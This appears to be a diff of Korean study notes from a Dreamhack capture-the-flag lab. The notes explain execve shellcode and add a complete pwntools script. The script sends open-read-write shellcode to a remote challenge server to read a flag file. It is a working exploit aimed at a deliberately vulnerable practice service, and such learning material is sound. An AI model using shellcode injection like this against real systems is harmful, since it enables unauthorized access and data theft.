@@ -19,3 +19,37 @@ $ run
 셸을 획득하면 시스템을 제어할 수 있게 되므로 셸 획득 = 시스템 해킹
 execve 셸코드는 임의의 프로그램을 실행하는 셸코드인데, 이를 이용하면 서버의 셸을 획득할수 있습니다.
 리눅스의 기본실행프로그램들은 /bin/디렉토리에 저장되있으므로 실행할 sh 쉘도 여기에 저장
+
+$ nasm -f elf shellcode.asm 
+하려고 하니 오류가 걸린다. 검색해서 봐보니 주석처리는 // 가 아닌 ; 클론으로 해야한느 것
+
+도움!
+pwntools를 이용하여 py파일을 만들어서 접속방법의 링크와 포트로 하기 (링크와 포트는 매번 달라지므로 수정필요)
+------ (shell_basic.py 라는 파일로 생성)
+#!/usr/bin/python3
+from pwn import * #pwntools를 사용하기 위한 부분
+
+p = remote('host1.dreamhack.games',  10551) #아래에 설명
+context.arch = 'amd64'
+r = "/home/shell_basic/flag_name_is_loooooong"
+
+shellcode = ''
+shellcode += shellcraft.open(r)
+shellcode += shellcraft.read('rax', 'rsp', 0x100)
+shellcode += shellcraft.write(1, 'rsp', 0x100)
+
+p.recvuntil("shellcode: ")
+p.sendline(asm(shellcode))
+print(p.recv())
+-------
+$ chmod u+x shell_basic.py
+$ ./shell_basic.py   #DH{~~~}가 나온다.
+
+
+
+블로그>
+pwntools 기능 설명 : https://blog.naver.com/sosbaoxbak/222024673089
+C언어 mmap: https://muabow.tistory.com/308
+
+
+
